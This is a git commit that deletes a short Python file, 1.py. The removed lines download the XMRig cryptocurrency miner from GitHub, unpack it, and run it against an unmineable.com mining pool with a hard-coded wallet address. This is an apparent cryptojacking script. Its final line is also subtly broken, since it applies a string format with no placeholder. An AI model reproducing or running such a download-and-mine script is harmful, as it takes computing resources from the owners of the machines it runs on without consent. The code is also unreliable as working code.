ca6c773ffaa33a9845cbde45258e4ad4d04d7390
fcknjudas <162876300+fcknjudas@users.noreply.github.com>
2025-02-18 16:23:02 +0300

    Delete 1.py

--- 1.py
+++
@@ -1,6 +0,0 @@
-import os
-import random
-from random import randint
-num = str(random.randint(1,1000000))
-os.system('wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz')
-os.system('cd xmrig-6.22.2 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -p x -u SOL:G5MFVuQvYabm9sknjwXi9HcHVLGYnEdiQcsQ3NASP1W3.tothemoonRX'%num)
